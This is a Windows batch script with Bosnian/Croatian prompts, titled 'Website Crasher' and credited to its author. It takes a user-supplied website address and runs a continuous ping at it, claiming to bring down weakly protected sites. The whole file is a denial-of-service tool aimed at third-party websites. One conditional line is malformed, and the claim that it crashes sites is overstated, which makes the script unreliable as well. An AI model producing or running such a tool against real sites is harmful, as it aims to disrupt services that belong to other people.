@echo off
Title Website Crasher (BY Kenan Husakovic)
color 0e
echo WebSite Crasher rusi stranice preporuceno slaba zastita (BY KENAN HUSAKOVIC)
set input=
set /p input= Unesite link stranice [WWW]:
color 0c
if %input%==goto A if NOT B
echo Rusenje pocinje (Pricekajte)
ping localhost>nul
echo Da zaustavite pritisnite CTRL + C
ping localhost>nul
cls
echo ----------------------------------------------------------------------
echo Stranicea se rusi! (UKOLIKO IMA ZASTITU NECE SE SRUSITI)
echo ----------------------------------------------------------------------
ping %input% -t -l 30